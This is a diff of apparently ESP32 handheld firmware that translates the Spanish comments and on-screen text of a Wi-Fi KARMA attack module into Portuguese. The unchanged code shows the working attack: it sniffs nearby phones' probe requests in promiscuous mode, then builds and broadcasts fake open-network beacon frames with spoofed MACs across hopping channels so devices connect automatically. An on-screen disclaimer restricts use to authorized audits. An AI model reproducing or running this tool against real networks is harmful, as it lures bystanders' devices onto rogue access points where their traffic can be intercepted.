@@ -10,19 +10,19 @@
 extern TFT_eSPI tft;
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CONFIGURACIÓN
+//  CONFIGURAÇÃO
 // ═══════════════════════════════════════════════════════════════════════════
 #define MAX_KARMA_SSIDS    50      // máx SSIDs que vamos a transmitir
 #define BEACON_INTERVAL_MS 100     // un beacon cada 100ms entre los SSIDs
 #define HOP_INTERVAL_MS    600     // cambio de canal cada 600ms
 #define UI_REFRESH_MS      500
-#define SCAN_TIME_S        15      // duración del scan inicial de probes
+#define SCAN_TIME_S        15      // duração do scan inicial de probes
 
 // ═══════════════════════════════════════════════════════════════════════════
 //  ESTADO
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Lista local de SSIDs a transmitir (copiada del Probe Sniffer)
+// Lista local de SSIDs a transmitir (copiada do Probe Sniffer)
 static char    karmaSSIDs[MAX_KARMA_SSIDS][33];
 static int     karmaCount = 0;
 static int     karmaCurrentIdx = 0;
@@ -36,15 +36,15 @@ static const int hopChannels[] = {1, 6, 11};
 static int hopIdx = 0;
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  BEACON FRAME TEMPLATE (red abierta, sin encriptación)
+//  BEACON FRAME TEMPLATE (rede aberta, sem encriptação)
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Estructura mínima de beacon frame:
+// Estrutura mínima de um beacon frame:
 //   [0-1]    Frame Control: 0x80, 0x00 (Beacon)
 //   [2-3]    Duration
 //   [4-9]    Destination: FF:FF:FF:FF:FF:FF (broadcast)
 //   [10-15]  Source MAC (lo randomizamos)
-//   [16-21]  BSSID (igual al source)
+//   [16-21]  BSSID (igual ao source)
 //   [22-23]  Sequence
 //   [24-31]  Timestamp
 //   [32-33]  Beacon Interval (0x64, 0x00 = 100ms)
@@ -63,10 +63,10 @@ static uint8_t beaconTemplate[128] = {
     0x21, 0x04,                            // Capabilities (ESS, no privacy)
     // ─── Tagged parameters ───
     0x00, 0x00,                            // Tag 0: SSID, length=0 (placeholder)
-    // SSID bytes irían aquí, después se rellena
+    // Os bytes do SSID viriam aqui, preenchidos depois
 };
 
-// Tagged params adicionales (después del SSID)
+// Tagged params adicionais (depois do SSID)
 static const uint8_t beaconTrailer[] = {
     0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,  // Supported Rates
     0x03, 0x01, 0x06   // DS Param Set: channel 6 (se actualiza por canal actual)
@@ -80,8 +80,8 @@ static void sendKarmaBeacon(const char* ssid, int channel) {
     int ssidLen = strlen(ssid);
     if (ssidLen > 32) ssidLen = 32;
 
-    // Generar MAC aleatoria pero consistente para este SSID
-    // (mismo SSID siempre tiene la misma MAC para que el cliente lo vea estable)
+    // Gera uma MAC aleatória, porém consistente para este SSID
+    // (o mesmo SSID sempre tem a mesma MAC para o cliente vê-lo estável)
     uint32_t hash = 0;
     for (int i = 0; i < ssidLen; i++) hash = hash * 31 + ssid[i];
 
@@ -101,7 +101,7 @@ static void sendKarmaBeacon(const char* ssid, int channel) {
     // Tagged trailer (rates + DS param set)
     int trailerOffset = 38 + ssidLen;
     memcpy(&beaconTemplate[trailerOffset], beaconTrailer, sizeof(beaconTrailer));
-    // Actualizar el byte del canal en DS Param Set
+    // Atualiza o byte do canal no DS Param Set
     beaconTemplate[trailerOffset + sizeof(beaconTrailer) - 1] = channel;
 
     int totalLen = trailerOffset + sizeof(beaconTrailer);
@@ -111,7 +111,7 @@ static void sendKarmaBeacon(const char* ssid, int channel) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  CALLBACK PROMISCUO · cuenta probes durante el ataque
+//  CALLBACK PROMÍSCUO · conta probes durante o ataque
 // ═══════════════════════════════════════════════════════════════════════════
 
 static void karmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
@@ -135,22 +135,22 @@ static bool showDisclaimer() {
     tft.drawFastHLine(0, 50, 320, TFT_RED);
 
     int y = 60;
-    drawStringCustom(10, y, "Captura los SSIDs que buscan",   UI_MAIN, 1); y += 12;
-    drawStringCustom(10, y, "celulares cercanos y los",       UI_MAIN, 1); y += 12;
+    drawStringCustom(10, y, "Captura os SSIDs que procuram",   UI_MAIN, 1); y += 12;
+    drawStringCustom(10, y, "celulares proximos e os",       UI_MAIN, 1); y += 12;
     drawStringCustom(10, y, "anuncia como redes existentes.", UI_MAIN, 1); y += 20;
 
-    drawStringCustom(10, y, "Dispositivos vulnerables se",    UI_ACCENT, 1); y += 12;
-    drawStringCustom(10, y, "conectaran AUTOMATICAMENTE.",    UI_ACCENT, 1); y += 20;
+    drawStringCustom(10, y, "Dispositivos vulneraveis se",    UI_ACCENT, 1); y += 12;
+    drawStringCustom(10, y, "conectarao AUTOMATICAMENTE.",    UI_ACCENT, 1); y += 20;
 
     drawStringCustom(10, y, "Uso LEGAL:",                      TFT_GREEN, 1); y += 12;
     drawStringCustom(20, y, "- Auditorias autorizadas",        UI_ACCENT, 1); y += 12;
     drawStringCustom(20, y, "- Demostraciones controladas",    UI_ACCENT, 1); y += 18;
 
-    drawStringCustom(10, y, "Atacar dispositivos ajenos =",    TFT_RED, 1); y += 12;
+    drawStringCustom(10, y, "Atacar dispositivos alheios =",    TFT_RED, 1); y += 12;
     drawStringCustom(10, y, "delito federal (Art. 211 bis).",  TFT_RED, 1);
 
     tft.drawFastHLine(0, 212, 320, TFT_RED);
-    drawStringCustom(10, 220, "OK: ENTIENDO   UP/DN: SALIR", UI_ACCENT, 1);
+    drawStringCustom(10, 220, "OK: ENTENDI   UP/DN: SAIR", UI_ACCENT, 1);
 
     while (true) {
         if (digitalRead(BTN_OK) == LOW) {
@@ -173,7 +173,7 @@ static bool showDisclaimer() {
 //  FASE 1: CAPTURA DE PROBES
 // ═══════════════════════════════════════════════════════════════════════════
 
-// Variables compartidas con el sniffer interno de KARMA
+// Variáveis compartilhadas com o sniffer interno do KARMA
 static char     scanSSIDs[MAX_KARMA_SSIDS][33];
 static volatile int      scanCount = 0;
 static volatile uint32_t scanProbeTotal = 0;
@@ -203,7 +203,7 @@ static void scanProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
     scanProbeTotal++;
 
-    // Ya está?
+    // Já existe?
     for (int i = 0; i < scanCount; i++) {
         if (strcmp(scanSSIDs[i], ssid) == 0) return;
     }
@@ -230,13 +230,13 @@ static bool runProbeCaptureFase() {
     drawStringCustom(10, 42, "Capturando probes...", UI_MAIN, 1);
     drawStringCustom(10, 56, "Duracion: " + String(SCAN_TIME_S) + "s",
                      UI_ACCENT, 1);
-    drawStringCustom(10, 68, "Espera a que celulares cercanos", UI_ACCENT, 1);
-    drawStringCustom(10, 80, "envien probe requests.", UI_ACCENT, 1);
+    drawStringCustom(10, 68, "Espera que celulares proximos", UI_ACCENT, 1);
+    drawStringCustom(10, 80, "enviem probe requests.", UI_ACCENT, 1);
 
     int barX = 10, barY = 105, barW = 300, barH = 14;
     tft.drawRect(barX, barY, barW, barH, UI_ACCENT);
 
-    // Setup promiscuo
+    // Setup promíscuo
     WiFi.mode(WIFI_MODE_NULL);
     delay(100);
 
@@ -280,7 +280,7 @@ static bool runProbeCaptureFase() {
             drawStringCustom(150, 150, String((int)scanProbeTotal),
                              TFT_CYAN, 2);
 
-            // Mostrar últimos 2 SSIDs como preview
+            // Mostra os últimos 2 SSIDs como preview
             if (scanCount > 0) {
                 int show = scanCount > 2 ? 2 : scanCount;
                 int yPreview = 195;
@@ -289,7 +289,7 @@ static bool runProbeCaptureFase() {
                     int realIdx = scanCount - 1 - i;
                     String s = String(scanSSIDs[realIdx]);
                     if (s.length() > 28) s = s.substring(0, 26) + "..";
-                    // No podemos dibujar ahí, ya está fuera del área limpia
+                    // Não dá para desenhar ali, já está fora da área limpa
                 }
             }
             lastDrawnCount = scanCount;
@@ -299,7 +299,7 @@ static bool runProbeCaptureFase() {
         delay(80);
     }
 
-    // Cleanup promiscuo
+    // Cleanup promíscuo
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_deinit();
@@ -308,7 +308,7 @@ static bool runProbeCaptureFase() {
     beep(2000, 50); delay(30);
     beep(2400, 80);
 
-    // Copiar a la lista de KARMA
+    // Copia para a lista do KARMA
     karmaCount = scanCount;
     for (int i = 0; i < karmaCount; i++) {
         strncpy(karmaSSIDs[i], scanSSIDs[i], 32);
@@ -319,7 +319,7 @@ static bool runProbeCaptureFase() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  FASE 2: ATAQUE (transmisión de beacons)
+//  FASE 2: ATAQUE (transmissão de beacons)
 // ═══════════════════════════════════════════════════════════════════════════
 
 static void drawAttackFrame() {
@@ -334,8 +334,8 @@ static void drawAttackFrame() {
     drawStringCustom(10, 42, "SSIDs falsos:", UI_ACCENT, 1);
     drawStringCustom(170, 42, "Beacons:", UI_ACCENT, 1);
     drawStringCustom(10, 95, "Probes captados:", UI_ACCENT, 1);
-    drawStringCustom(10, 145, "Canal actual:", UI_ACCENT, 1);
-    drawStringCustom(10, 175, "SSID transmitiendo:", UI_ACCENT, 1);
+    drawStringCustom(10, 145, "Canal atual:", UI_ACCENT, 1);
+    drawStringCustom(10, 175, "SSID transmitindo:", UI_ACCENT, 1);
 
     tft.drawFastHLine(0, 212, 320, TFT_RED);
     drawStringCustom(10, 220, "OK(HOLD): STOP", TFT_RED, 1);
@@ -416,9 +416,9 @@ static void runAttackLoop() {
             lastHop = millis();
         }
 
-        // Send beacon (rotando entre todos los SSIDs)
+        // Send beacon (girando entre todos os SSIDs)
         if (millis() - lastBeacon > BEACON_INTERVAL_MS / 4) {
-            // Mandamos varios beacons rápido para mejorar adopción
+            // Mandamos vários beacons rápido para melhorar a adoção
             for (int burst = 0; burst < 3; burst++) {
                 if (karmaCount > 0) {
                     sendKarmaBeacon(karmaSSIDs[karmaCurrentIdx], currentChannel);
@@ -468,7 +468,7 @@ static void runAttackLoop() {
 // ═══════════════════════════════════════════════════════════════════════════
 
 void runKarma() {
-    // Esperar liberación de OK
+    // Espera a liberação do OK
     while (digitalRead(BTN_OK) == LOW) delay(5);
     delay(100);
 
@@ -487,12 +487,12 @@ void runKarma() {
         tft.fillScreen(TFT_BLACK);
         tft.drawRect(0, 0, 320, 240, UI_MAIN);
         drawStringBig(20, 80, "NO PROBES CAUGHT", TFT_RED, 1);
-        drawStringCustom(20, 120, "No se capturo ningun probe.", UI_ACCENT, 1);
+        drawStringCustom(20, 120, "Nenhum probe capturado.", UI_ACCENT, 1);
         drawStringCustom(20, 134, "Causas posibles:", UI_ACCENT, 1);
-        drawStringCustom(30, 148, "- No hay celulares cerca", UI_ACCENT, 1);
-        drawStringCustom(30, 160, "- Estan conectados a redes", UI_ACCENT, 1);
+        drawStringCustom(30, 148, "- Nao ha celulares perto", UI_ACCENT, 1);
+        drawStringCustom(30, 160, "- Estao conectados a redes", UI_ACCENT, 1);
         drawStringCustom(30, 172, "- iPhones modernos no probean", UI_ACCENT, 1);
-        drawStringCustom(20, 220, "OK: Volver", UI_MAIN, 1);
+        drawStringCustom(20, 220, "OK: Voltar", UI_MAIN, 1);
 
         while (digitalRead(BTN_OK) == HIGH) delay(20);
         beep(1500, 60);
@@ -500,7 +500,7 @@ void runKarma() {
         return;
     }
 
-    // 3. Pantalla de transición + confirmación
+    // 3. Tela de transição + confirmação
     tft.fillScreen(TFT_BLACK);
     tft.drawRect(0, 0, 320, 240, UI_MAIN);
     drawStringBig(80, 12, "READY", TFT_GREEN, 2);
@@ -511,9 +511,9 @@ void runKarma() {
     drawStringCustom(180, 78, String(karmaCount), TFT_GREEN, 2);
 
     drawStringCustom(10, 110, "Comenzar a transmitir falsos", UI_MAIN, 1);
-    drawStringCustom(10, 122, "beacons para atraer dispositivos?", UI_MAIN, 1);
+    drawStringCustom(10, 122, "beacons para atrair dispositivos?", UI_MAIN, 1);
 
-    drawStringCustom(10, 150, "Algunos SSIDs detectados:", UI_ACCENT, 1);
+    drawStringCustom(10, 150, "Alguns SSIDs detectados:", UI_ACCENT, 1);
     int show = karmaCount > 4 ? 4 : karmaCount;
     for (int i = 0; i < show; i++) {
         String s = String(karmaSSIDs[i]);
